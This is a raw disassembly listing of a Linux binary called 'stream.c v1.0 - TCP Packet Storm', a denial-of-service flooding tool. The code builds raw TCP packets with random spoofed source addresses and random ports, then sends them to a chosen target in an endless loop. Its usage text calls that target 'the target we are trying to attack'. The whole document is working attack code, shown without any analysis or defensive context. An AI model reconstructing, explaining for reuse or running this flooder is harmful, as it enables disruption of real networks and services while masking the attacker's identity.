xor ebp, ebp
pop esi
mov ecx, esp
and esp, 0xfffffff8
push eax
push esp
push edx
push loc.gcc2_compiled._3
push sym._init
push ecx
push esi
push main
call sym.imp.__libc_start_main
jmp dword [reloc.__libc_start_main]
push ebp
mov ebp, esp
sub esp, 8
cmp dword [obj.completed.4], 0
jne 0x804887d
jmp 0x8048853
mov eax, dword [obj.p.3]
lea edx, [eax + 4]
mov dword [obj.p.3], edx
mov eax, dword [eax]
call eax
mov eax, dword [obj.p.3]
cmp dword [eax], 0
jne 0x8048841
mov eax, sym.imp.__deregister_frame_info
test eax, eax
je 0x8048873
add esp, 0xfffffff4
push obj.__EH_FRAME_BEGIN__
call sym.imp.__deregister_frame_info
mov dword [obj.completed.4], 1
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov eax, sym.imp.__register_frame_info
test eax, eax
je 0x80488b1
add esp, 0xfffffff8
push obj.object.11
push obj.__EH_FRAME_BEGIN__
call sym.imp.__register_frame_info
mov esp, ebp
pop ebp
ret
jmp dword [reloc.__register_frame_info]
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0x14
push ebx
mov ebx, obj.__CTOR_LIST__
cmp dword [obj.__CTOR_LIST__], 0xffffffff
je 0x8048e61
mov eax, dword [ebx]
call eax
add ebx, 0xfffffffc
cmp dword [ebx], 0xffffffff
jne 0x8048e55
pop ebx
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 8
mov esp, ebp
pop ebp
ret
push ebp
mov ebp, esp
sub esp, 0x18
add esp, 0xfffffff4
mov eax, dword [arg_8h]
push eax
call sym.imp.gethostbyname
add esp, 0x10
mov eax, eax
mov dword [var_4h], eax
cmp dword [var_4h], 0
jne 0x8048a13
add esp, 0xfffffffc
mov eax, dword [arg_8h]
push eax
push str.Could_not_resolve__s._n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 0x10
add esp, 0xfffffff4
push 1
call sym.imp.exit
add esp, 0x10
mov eax, dword [var_4h]
mov edx, dword [eax + 0x10]
mov eax, dword [edx]
mov edx, dword [eax]
mov eax, edx
jmp 0x8048a21
mov esp, ebp
pop ebp
ret
jmp dword [reloc.gethostbyname]
jmp dword [reloc.fprintf]
jmp dword [reloc.exit]
push ebp
mov ebp, esp
sub esp, 8
add esp, 0xfffffffc
mov eax, dword [arg_8h]
push eax
push str.Usage:__s__dstaddr___dstport___pktsize___pps__n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 0x10
add esp, 0xfffffff8
push str.____dstaddr____the_target_we_are_trying_to_attack._n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 0x10
add esp, 0xfffffff8
push str.____dstport____the_port_of_the_target__0__random._n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 0x10
add esp, 0xfffffff8
push str.____pktsize____the_extra_size_to_use.__0__normal__nsyn._n
mov eax, dword [obj.stderr]
push eax
call sym.imp.fprintf
add esp, 0x10
add esp, 0xfffffff4
push 1
call sym.imp.exit
push ebp
mov ebp, esp
push ebx
call 0x8048631
pop ebx
add ebx, 0x1a23
cmp dword [ebx + 0x70], 0
je 0x8048646
call loc.imp.__gmon_start__
mov esi, esi
call sym.frame_dummy
call loc.gcc2_compiled._2
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x1c
push edi
push esi
push ebx
add esp, 0xfffffffc
push 0x28
push 0
push obj.packet
call sym.imp.memset
add esp, 0x10
mov dword [var_8h], 0
mov dword [var_4h], 0xa
and byte [obj.packet], 0xf0
or byte [obj.packet], 5
and byte [obj.packet], 0xf
or byte [obj.packet], 0x40
mov byte [0x804a1c9], 6
mov byte [0x804a1c1], 8
call sym.imp.rand
mov eax, eax
mov word [0x804a1c4], ax
mov word [0x804a1c2], 0x28
mov word [0x804a1c6], 0
mov byte [0x804a1c8], 0xff
mov eax, dword [obj.dstaddr]
mov dword [0x804a1d0], eax
mov byte [0x804a1e1], 0
add esp, 0xfffffff4
push 0x4000
call sym.imp.htons
add esp, 0x10
mov eax, eax
mov word [0x804a1e2], ax
call sym.imp.random
mov eax, eax
mov dword [0x804a1d8], eax
mov dword [0x804a1dc], 0
and byte [0x804a1e0], 0xf
or byte [0x804a1e0], 0x50
mov word [0x804a1e6], 0
call sym.imp.rand
mov eax, eax
mov word [0x804a1d4], ax
cmp word [obj.dstport], 0
je 0x8048b28
add esp, 0xfffffff4
xor eax, eax
mov ax, word [obj.dstport]
push eax
call sym.imp.htons
add esp, 0x10
mov ebx, eax
jmp 0x8048b31
call sym.imp.rand
mov eax, eax
mov ebx, eax
mov word [0x804a1d6], bx
mov eax, dword [obj.dstaddr]
mov dword [0x804a204], eax
mov byte [0x804a208], 0
mov byte [0x804a209], 6
add esp, 0xfffffff4
push 0x14
call sym.imp.htons
add esp, 0x10
mov eax, eax
mov word [0x804a20a], ax
mov word [obj.s_in], 2
mov eax, dword [obj.dstaddr]
mov dword [0x804a228], eax
mov ax, word [0x804a1d6]
mov word [0x804a226], ax
mov dword [var_ch], 0
nop
lea esi, [esi]
call sym.imp.random
mov eax, eax
mov edx, eax
mov dword [0x804a1cc], edx
mov dword [obj.cksum], edx
inc word [0x804a1c4]
inc word [0x804a1d4]
inc dword [0x804a1d8]
cmp word [obj.dstport], 0
jne 0x8048bda
call sym.imp.rand
mov eax, eax
mov edx, eax
mov word [0x804a1d6], dx
mov word [0x804a226], dx
mov word [0x804a1ca], 0
mov word [0x804a1e4], 0
mov edi, 0x804a20c
mov esi, 0x804a1d4
cld
mov ecx, 5
rep movsd dword es:[edi], dword ptr [esi]
add esp, 0xfffffff8
push 0x14
push obj.packet
call sym.in_cksum
add esp, 0x10
mov eax, eax
mov word [0x804a1ca], ax
add esp, 0xfffffff8
push 0x20
push obj.cksum
call sym.in_cksum
add esp, 0x10
mov eax, eax
mov word [0x804a1e4], ax
add esp, 0xfffffff8
push 0x10
mov eax, obj.s_in
push eax
push 0
push 0x28
push obj.packet
mov eax, dword [obj.sock]
push eax
call sym.imp.sendto
add esp, 0x20
mov eax, eax
test eax, eax
jge 0x8048c6a
add esp, 0xfffffff4
push str.jess
call sym.imp.perror
add esp, 0x10
inc dword [var_ch]
jmp 0x8048b90
push ebp
mov ebp, esp
sub esp, 0x10
push esi
push ebx
mov dword [var_4h], 1
add esp, 0xfffffff4
push str.stream.c_v1.0___TCP_Packet_Storm_n
call sym.imp.printf
add esp, 0x10
add esp, 0xfffffffc
push 0xff
push 3
push 2
call sym.imp.socket
add esp, 0x10
mov eax, eax
mov dword [obj.sock], eax
cmp dword [obj.sock], 0
jge 0x8048ce0
add esp, 0xfffffff4
push str.socket
call sym.imp.perror
add esp, 0x10
add esp, 0xfffffff4
push 1
call sym.imp.exit
add esp, 0x10
lea esi, [esi]
add esp, 0xfffffff4
call sym.imp.getgid
mov eax, eax
push eax
call sym.imp.setgid
add esp, 0x10
add esp, 0xfffffff4
call sym.imp.getuid
mov eax, eax
push eax
call sym.imp.setuid
add esp, 0x10
cmp dword [argv], 3
jg 0x8048d1d
add esp, 0xfffffff4
mov eax, dword [envp]
mov edx, dword [eax]
push edx
call loc.gcc2_compiled._4
add esp, 0x10
add esp, 0xfffffff4
push 4
lea eax, [var_4h]
push eax
push 3
push 0
mov eax, dword [obj.sock]
push eax
call sym.imp.setsockopt
add esp, 0x20
mov eax, eax
test eax, eax
jge 0x8048d60
add esp, 0xfffffff4
push str.setsockopt
call sym.imp.perror
add esp, 0x10
add esp, 0xfffffff4
push 1
call sym.imp.exit
add esp, 0x10
nop
lea esi, [esi]
add esp, 0xfffffff4
add esp, 0xfffffff4
push 0
call sym.imp.time
add esp, 0x10
mov ebx, eax
call sym.imp.getpid
mov esi, eax
call sym.imp.getppid
mov eax, eax
mov edx, ebx
xor edx, esi
add eax, edx
push eax
call sym.imp.srand
add esp, 0x10
add esp, 0xfffffff4
push str._nResolving_IPs...
call sym.imp.printf
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [obj.stdout]
push eax
call sym.imp.fflush
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [envp]
add eax, 4
mov edx, dword [eax]
push edx
call sym.lookup
add esp, 0x10
mov eax, eax
mov dword [obj.dstaddr], eax
add esp, 0xfffffff4
mov eax, dword [envp]
add eax, 8
mov edx, dword [eax]
push edx
call sym.imp.atoi
add esp, 0x10
mov eax, eax
mov word [obj.dstport], ax
add esp, 0xfffffff4
mov eax, dword [envp]
add eax, 0xc
mov edx, dword [eax]
push edx
call sym.imp.atoi
add esp, 0x10
mov eax, eax
mov word [obj.pktsize], ax
add esp, 0xfffffff4
push str.Sending...
call sym.imp.printf
add esp, 0x10
add esp, 0xfffffff4
mov eax, dword [obj.stdout]
push eax
call sym.imp.fflush
add esp, 0x10
call sym.flooder
xor eax, eax
jmp 0x8048e30
lea esi, [esi]
lea esp, [var_18h]
pop ebx
pop esi
mov esp, ebp
pop ebp
ret
jmp dword [reloc.printf]
jmp dword [reloc.socket]
jmp dword [reloc.perror]
jmp dword [reloc.getgid]
jmp dword [reloc.setgid]
jmp dword [reloc.getuid]
jmp dword [reloc.setuid]
jmp dword [reloc.setsockopt]
jmp dword [reloc.time]
jmp dword [reloc.getpid]
jmp dword [reloc.getppid]
jmp dword [reloc.srand]
jmp dword [reloc.fflush]
jmp dword [reloc.atoi]
push ebp
mov ebp, esp
push ebx
call 0x8048e7d
pop ebx
add ebx, 0x11d7
call loc.gcc2_compiled._1
mov ebx, dword [var_4h]
leave
ret
push ebp
mov ebp, esp
sub esp, 0x1c
push edi
push esi
push ebx
mov edx, dword [arg_8h]
mov ecx, dword [arg_ch]
mov ebx, ecx
mov esi, edx
xor edi, edi
mov word [var_2h], 0
nop
cmp ebx, 1
jg 0x8048967
jmp 0x8048976
xor eax, eax
mov ax, word [esi]
add edi, eax
add esi, 2
add ebx, 0xfffffffe
jmp 0x8048960
cmp ebx, 1
jne 0x8048988
mov al, byte [esi]
mov byte [var_2h], al
xor eax, eax
mov ax, word [var_2h]
add edi, eax
mov eax, edi
sar eax, 0x10
mov dword [var_10h], eax
mov eax, edi
and eax, 0xffff
mov dword [var_8h], eax
mov edi, dword [var_10h]
add edi, dword [var_8h]
mov eax, edi
sar eax, 0x10
add edi, eax
mov eax, edi
xor eax, 0xffff
mov word [var_2h], ax
xor eax, eax
mov ax, word [var_2h]
mov dword [var_ch], eax
mov eax, dword [var_ch]
jmp 0x80489c0
lea esp, [var_28h]
pop ebx
pop esi
pop edi
mov esp, ebp
pop ebp
ret
jmp dword [reloc.random]
jmp dword [reloc.__deregister_frame_info]
jmp dword [reloc.rand]
jmp dword [reloc.sendto]
jmp dword [reloc.memset]
jmp dword [reloc.htons]
